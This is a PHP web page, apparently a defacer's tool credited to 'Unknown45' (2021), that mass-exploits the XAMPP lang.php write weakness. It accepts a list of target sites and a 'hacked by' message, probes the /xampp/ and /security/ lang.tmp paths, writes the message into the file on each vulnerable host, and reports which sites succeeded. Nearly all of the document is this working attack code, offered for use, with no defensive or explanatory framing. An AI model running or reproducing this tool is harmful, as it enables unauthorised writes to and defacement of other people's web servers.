<html>
<head>
<title>[+] XAMPP Local Write Access Auto Exploit [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white">
<style>
	@import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 90%;
width: 500px;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

button {
	background: transparent;
    font-family: Staatliches;
	color: #ffffff;
	border-color: #ffffff;
	cursor: pointer;
}

input {
	background: transparent;
	font-family: Staatliches;
	color: #ffffff;
	border-color: #ffffff;
	cursor: pointer;
}

font {
	font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: #1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: #1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}
</style>
<body><center>
<font face=courier new size=5>XAMPP Local Write Access Auto Exploit<hr><br>
<form method='POST' action=''>
</font><font face=courier new size=3>Target<br>
<textarea name='target' placeholder='target.com
target.com/[path]' cols=50 rows=10 required></textarea><br><br>
kata kata<br>
<input type='text' name='msg' placeholder='hacked by unknown45'/>
<br><br>
<input type='submit' class='asu' value='Exploit' /></form><hr>
		<?php
		error_reporting(0);
		if($_POST){
			$target = $_POST['target'];
			$msg = htmlspecialchars(str_replace(" ","_",$_POST['msg']));
			$msg1 = str_replace("<","_",$msg);
			$msg2 = str_replace(">","_",$msg1);
			$msg3 = str_replace("&gt;","_",$msg2);
			$pwn = str_replace("&lt;","_",$msg3);
			
			if($pwn == ""){
				$pwn = "hacked_by_unknown45";
			}
			
			$targets = explode("\r\n",$target);
			foreach($targets as $site){
				if(!preg_match("/^http:\/\//",$site) AND !preg_match("/^https:\/\//",$site)){
					$sites = "http://$site";
				}else{
					$sites = $site;
				}
				$showsites = htmlspecialchars($sites);
				
				$chx = curl_init("$sites/xampp/lang.tmp");
				curl_setopt($chx, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($chx, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($chx, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($chx, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
				curl_exec($chx);
				$httpcodex = curl_getinfo($chx, CURLINFO_HTTP_CODE);
				curl_close($chx);
				
				$chs = curl_init("$sites/security/lang.tmp");
				curl_setopt($chs, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($chs, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($chs, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($chs, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
				curl_exec($chs);
				$httpcodes = curl_getinfo($chs, CURLINFO_HTTP_CODE);
				curl_close($chs);
				
				if($httpcodex == 200){
					$ck = curl_init("$sites/xampp/lang.php?$pwn");
					curl_setopt($ck, CURLOPT_FOLLOWLOCATION, 1);
					curl_setopt($ck, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ck, CURLOPT_SSL_VERIFYPEER, 0);
					curl_setopt($ck, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
					$cka = curl_exec($ck);
					if($cka){
						$ch = curl_init("$sites/xampp/lang.tmp");
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
						$cek = curl_exec($ch);
						if(preg_match("/$pwn/",$cek)){
							echo "<a href='$sites/xampp/lang.tmp' target='_blank'>$showsites/xampp/lang.tmp</a> => OK<br>";
						}else{
							echo "$showsites => FAILED<br>";
						}
						curl_close($ch);
					}
				}else if($httpcodes == 200){
					$ck = curl_init("$sites/security/lang.php?$pwn");
					curl_setopt($ck, CURLOPT_FOLLOWLOCATION, 1);
					curl_setopt($ck, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ck, CURLOPT_SSL_VERIFYPEER, 0);
					curl_setopt($ck, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
					$cka = curl_exec($ck);
					if($cka){
						$ch = curl_init("$sites/security/lang.tmp");
						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0");
						$cek = curl_exec($ch);
						if(preg_match("/$pwn/",$cek)){
							echo "<a href='$sites/security/lang.tmp' target='_blank'>$showsites/security/lang.tmp</a> => OK<br>";
						}else{
							echo "$showsites => Gagal<br>";
						}
						curl_close($ch);
					}
				}else{
					echo "$showsites => Not Vuln<br>";
				}
			}
		}
		?>
	</body>
<center><hr><font size=3>Unknown45 - 2021</font>
</html>

